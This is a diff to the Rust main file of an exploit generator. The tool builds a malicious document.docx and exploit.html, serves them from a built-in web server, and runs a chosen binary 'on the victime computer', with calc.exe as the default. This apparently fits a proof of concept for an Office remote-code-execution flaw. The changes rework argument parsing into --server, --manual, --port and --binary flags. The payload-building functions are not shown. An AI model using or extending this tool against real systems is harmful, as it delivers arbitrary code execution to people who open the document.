@@ -1,15 +1,15 @@
 //extern crate local_ip;
 pub mod local_ip;
+pub mod parse_args;
 
 use d::start;
 use std::fs::{create_dir_all, write, File};
 use std::io::prelude::*;
 use std::io::{Seek, Write};
 use std::iter::Iterator;
-use std::net::{IpAddr, Ipv4Addr, SocketAddr, SocketAddrV4, SocketAddrV6};
+use std::net::{IpAddr, SocketAddr, SocketAddrV4, SocketAddrV6};
 use std::path::Path;
 use std::process::exit;
-use std::str::FromStr;
 use walkdir::{DirEntry, WalkDir};
 use zip::result::ZipError;
 use zip::write::FileOptions;
@@ -23,90 +23,64 @@ fn main() {
     println!("*                                                              *");
     println!("****************************************************************");
 
-    let ifaces_list = local_ip::get_ifaces();
     let args: Vec<_> = std::env::args().collect();
+    let (vec_flag, _vec_args) = parse_args::parse_args(&args);
+    if parse_args::get_flag_value("h", &vec_flag) == Some("".to_string())
+        || parse_args::get_flag_value("help", &vec_flag) == Some("".to_string())
+    {
+        usage(&args[0]);
+        exit(0);
+    }
     let docx_name = "document.docx".to_string();
     let html_name = "exploit.html".to_string();
-    let mut binary = "\\\\windows\\\\system32\\\\calc";
-    let mut ip: IpAddr = IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1));
-    let mut port = 8080;
-    let mut start_httpd = false;
+    let mut start_httpd = true;
 
-    if args.len() >= 2 {
-        if args[1] == "--help" {
-            usage(&args[0]);
-            exit(0)
-        } else if args[1] == "--server" {
-            start_httpd = true;
-            if args.len() >= 4 {
-                let iface = args[2].trim();
-                let ifaces_listing = ifaces_list.clone();
-                if ifaces_list.contains(&iface.to_string()) {
-                    let opt_local_ip = local_ip::get_iface_addr(iface);
-                    if opt_local_ip.is_some() {
-                        ip = local_ip::get_iface_addr(iface).unwrap();
-                    } else {
-                        println!("Interface has no IP address.");
-                        exit(1)
-                    }
-                } else {
-                    println!(
-                        "Network interface {} not found. Possible interfaces are:",
-                        iface
-                    );
-                    for itf in ifaces_listing {
-                        if itf != "" {
-                            println!("* {}", itf);
-                        }
-                    }
-                    exit(1);
-                }
-                binary = args[3].trim();
-            } else {
-                ip = IpAddr::from_str("127.0.0.1").unwrap();
-                if args.len() > 2 {
-                    binary = args[2].trim();
-                } else {
-                    binary = "\\\\windows\\\\system32\\\\calc.exe"
-                }
-            }
+    let opt_binary = parse_args::get_flag_value("binary", &vec_flag);
+    let binary_string = match opt_binary {
+        Some(value) => value,
+        None => "\\\\windows\\\\system32\\\\calc".to_string(),
+    };
+    let binary = &binary_string[..];
+
+    let ip;
+
+    if parse_args::get_flag_value("manual", &vec_flag) == None {
+        let opt_iface = parse_args::get_flag_value("server", &vec_flag);
+        let iface_string = match opt_iface {
+            Some(value) => value,
+            None => "lo".to_string(),
+        };
+
+        let iface = &iface_string[..];
+        let opt_local_ip = local_ip::get_iface_addr(iface);
+        if opt_local_ip.is_some() {
+            ip = local_ip::get_iface_addr(iface).unwrap();
         } else {
-            start_httpd = false;
-            if args.len() == 4 {
-                let addr = IpAddr::from_str(&args[1]);
-                ip = match addr {
-                    Ok(_) => addr.unwrap(),
-                    Err(_) => {
-                        println!("First argument is not an IP Address.");
-                        exit(1);
-                    }
-                };
-                let opt_portnum = args[2].trim().parse::<i32>();
-
-                match opt_portnum {
-                    Ok(value) => {
-                        if get_type_of(&value) == "i32" {
-                            let portnum: i32 = value;
-                            if portnum > 0 && portnum <= 65535 {
-                                port = portnum;
-                            } else {
-                                println!("Second argument must be a port number.");
-                                exit(1);
-                            }
-                        } else {
-                            println!("Second argument must be a port number.");
-                            exit(1);
-                        }
-                    }
-                    Err(_) => {
-                        println!("Second argument must be a port number.");
-                        exit(1);
-                    }
-                }
-                binary = args[3].trim();
-            };
+            println!("Interface has no IP address.");
+            exit(1)
         }
+    } else {
+        start_httpd = false;
+        let opt_addr = parse_args::get_flag_value("manual", &vec_flag);
+        let addr_string = match opt_addr {
+            Some(value) => value,
+            None => "127.0.0.1".to_string(),
+        };
+
+        ip = addr_string.parse::<IpAddr>().unwrap();
     }
+
+    let opt_port = parse_args::get_flag_value("port", &vec_flag);
+    let port_string = match opt_port {
+        Some(value) => value,
+        None => "8080".to_string(),
+    };
+
+    let portnum = port_string.parse::<u16>();
+    let port = match portnum {
+        Ok(value) => value,
+        Err(_) => 8080,
+    };
 
     println!(
         "Generating files 
@@ -126,60 +100,47 @@ Configuration:
     let _ = generate_docx(docx_name, payload_url);
 
     if start_httpd == true {
-        println!("\nServer Ready at {}:{}", ip, port);
+        let socket: SocketAddr;
+        match ip {
+            IpAddr::V4(ipv4) => {
+                let socket_v4 = SocketAddrV4::new(ipv4, port);
+                socket = SocketAddr::V4(socket_v4);
+            }
+            IpAddr::V6(ipv6) => {
+                let socket_v6 = SocketAddrV6::new(ipv6, port, 0, 0);
+                socket = SocketAddr::V6(socket_v6);
+            }
+        };
+
+        println!("\nServer starting... Please, visit http://{0}:{1}/document.docx to download the document.", ip, port);
+        start(&socket, "./www");
     } else {
         println!(
             "\nNo server started. Please copy ./www/exploit.html to the webserver at {} on port {}",
             ip, port
         );
     }
-    if start_httpd == true {
-        let socket: SocketAddr;
-        match ip {
-            IpAddr::V4(ipv4) => {
-                let socket_v4 = SocketAddrV4::new(ipv4, 8080);
-                socket = SocketAddr::V4(socket_v4);
-            }
-            IpAddr::V6(ipv6) => {
-                let socket_v6 = SocketAddrV6::new(ipv6, 8080, 0, 0);
-                socket = SocketAddr::V6(socket_v6);
-            }
-        };
-        let _ = start(&socket, "./www");
-    }
 }
 
 fn usage(cmd: &str) {
     println!(
-        "Usage: {} <ip addr> <port> <binary to execute>             
-        # Manual mode : Only genetrates docx and html files ",
-        cmd
-    );
-    println!(
-        "Usage: {}
-        # Manual mode : Only genetrates docx and html files pointing to 127.0.0.1:8080 and launching calc.exe",
-        cmd
-    );
-    println!("Usage: {} --server
-        # Server mode : Genetrates docx and html files and bind a web server to localhost:8080, the exploit launches calc.exe", cmd);
-    println!(
-        "Usage: {} --server <binary to execute>                     
-        # Server mode : Genetrates docx and html files and bind a web server to localhost:8080",
-        cmd
-    );
-    println!(
-        "Usage: {} --server <network interface> <binary to execute> 
-        # Server mode : Genetrates docx and html files and bind a web server to iface_ip_addr:8080",
-        cmd
-    );
-    println!(
-        "Usage: {} --help                                           # Print this message.",
-        cmd
-    );
-}
+        "Usage: {} [Options]
 
-fn get_type_of<T>(_: &T) -> &str {
-    std::any::type_name::<T>()
+Options:
+        --server=interface  # Bind server to IP address of provided interface
+                            # Default value \"lo\"
+        --manual=ipadr      # Manual mode : Only generate docx and html files without binding a server
+                            # Default value \"127.0.0.1\"
+        --port=portnumber   # Bind server to provided port
+                            # Default value \"8080\"
+        --binary=binarypath # Make a payload to execue binarypath on the victime computer
+                            # Default value \"\\\\\\\\windows\\\\\\\\system32\\\\\\\\calc\"
+                            # Binary path should not include the file extention e.g. .exe
+                            # On linux binarypath should be double excaped:
+                            # e.g. \\\\\\\\windows\\\\\\\\system32\\\\\\\\calc
+                            # On windows binarypath should be excaped:
+                            # e.g. \\\\windows\\\\system32\\\\calc
+        -h or --help        # print this message ", cmd);
 }
 
 fn generate_docx(docx_name: String, payload_url: String) {
